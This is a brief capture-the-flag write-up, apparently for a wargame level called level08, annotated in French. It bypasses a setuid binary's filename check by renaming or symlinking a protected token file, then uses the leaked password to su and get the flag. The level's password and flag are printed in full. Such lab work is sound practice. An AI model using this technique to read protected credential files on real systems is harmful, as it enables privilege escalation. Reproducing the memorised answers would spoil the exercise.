@@ -1,0 +1,35 @@
+#ls -l
+-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
+-rw-------  1 flag08  flag08    26 Mar  5  2016 token
+
+#./level08
+./level08 [file to read]
+- Semble nous donner l'usage. Le binaire prend un file en arguments
+
+#./level08 token
+You may not access 'token'
+- le file token n'est pas accessible, semble etre un display propre au programme
+
+#echo "coucou" > test
+#./level08 test
+coucou
+- Display le content du fichier
+
+- Le script est execute par flag08 et flag08 a les droit de lecture et d'ecriture sur token, ce doit donc etre le nom du fichier qui est verifie dans l'executable. 
+
+#chmod 777 .
+Comme le dossier nous appartient, nous changeons ses droits pour pouvoir ensuite changer le nom
+
+#mv token tok 
+#(ou) ln -s token tok (pour faire plutot un lien symbolique)
+
+#./level08 tok 
+quif5eloekouj29ke0vouxean
+
+#su flag08
+Don't forget to launch getflag !
+
+#getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+
+
